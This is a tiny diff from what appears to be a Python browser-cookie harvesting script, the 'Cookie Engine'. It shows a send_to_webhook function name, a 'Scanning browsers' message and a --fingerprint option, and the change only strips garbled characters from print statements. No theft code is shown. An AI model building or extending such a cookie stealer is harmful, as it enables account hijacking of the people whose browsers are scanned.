@@ -636,8 +636,8 @@ def send_to_webhook(zip_path, webhook_url):
         pass
 
 def main():
-    print(f"� Cookie Engine Started")
-    print(f"�🔎 Scanning browsers...")
+    print(f"Cookie Engine Started")
+    print(f"Scanning browsers...")
     parser = argparse.ArgumentParser()
     parser.add_argument('mode', nargs='?', default='all')
     parser.add_argument('--fingerprint', action='store_true')
